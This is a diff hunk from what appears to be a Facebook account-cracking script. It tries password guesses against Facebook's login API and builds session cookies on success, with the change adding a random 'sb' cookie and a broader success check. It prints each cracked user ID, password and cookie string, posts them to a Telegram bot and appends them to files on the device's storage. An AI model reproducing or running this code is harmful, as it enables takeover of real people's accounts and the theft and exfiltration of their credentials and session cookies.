@@ -934,17 +934,17 @@ def m7(ids,pwv):
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             url = 'htt'+'ps://g'+'raph.face'+'book.com/auth/login'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
-            if 'access_token' in q:
-                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+            if 'access_token' in q or 'session_key' in q:
+                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{coki}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{cookie}\33[1;36m");linex()
+                        statusok = (f" {cid} | {pas} | {cookie} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+cookie+'\n')
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
